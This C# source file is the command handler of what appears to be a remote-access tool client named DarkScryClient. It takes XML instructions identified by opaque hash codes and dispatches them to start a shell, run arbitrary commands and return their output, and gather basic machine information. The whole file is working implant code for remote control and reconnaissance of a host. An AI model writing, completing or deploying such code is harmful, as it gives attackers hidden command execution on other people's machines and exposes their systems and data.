using DarkScryClient.Moduls.Collection;
using DarkScryClient.Utils;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Xml;

namespace DarkScryClient.Client
{
	internal class CommandHandler : IDisposable
	{
		private readonly struct CommandIdentifiers
		{
			public const string START_SHELL_INSTANCE   = "be425fd08e9ea24230bac47493228ada";
			public const string RUN_COMMAND            = "58e129c7158b9fed8be5473640e54ae4";
			public const string GET_BASIC_MACHINE_INFO = "929cecb8e795d93306020c7f2e8682d2";

		}

		private XmlDocument xmlDoc;
		private CSShellServicecs _CShellServicecs;
		public CommandHandler()
		{
			xmlDoc = new XmlDocument();
			_CShellServicecs = null;
		}

		public byte[] RunCommand(string XmlCommand)
		{
			xmlDoc.LoadXml(XmlCommand);
			string action = xmlDoc.SelectSingleNode("/root/action").InnerText;
			switch (action)
			{
				case CommandIdentifiers.START_SHELL_INSTANCE:
					if (!Info.IsMainShellRuning)
					{
						_CShellServicecs = new CSShellServicecs();	
					}
					return PackCommand("Success", CommandIdentifiers.START_SHELL_INSTANCE, 0);

				case CommandIdentifiers.RUN_COMMAND:
					if (!Info.IsMainShellRuning)
					{
						return PackCommand("Shell is not runing", action, 1);
					}
					string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
					string output = _CShellServicecs.RunCommand(command);
					return PackCommand(output, action, 0);

				case CommandIdentifiers.GET_BASIC_MACHINE_INFO:
					var bmi = MachineInfo.BasicMachineInfoRetriever.GetBasicMachineInfo();
					return Tools.StringToBytes(JsonSerializer.Serialize(bmi));
				default:
					return PackCommand("Unknow Action", action, 1);
			}
		}

		private byte[] PackCommand(string output, string type, int status) 
		{
			Models.CommandOutput model = new Models.CommandOutput { output = output, type = type, status = status };
			return Tools.SerializeToJson(model);
		}

		public void Dispose()
		{
			_CShellServicecs?.Dispose();
		}
	}
}
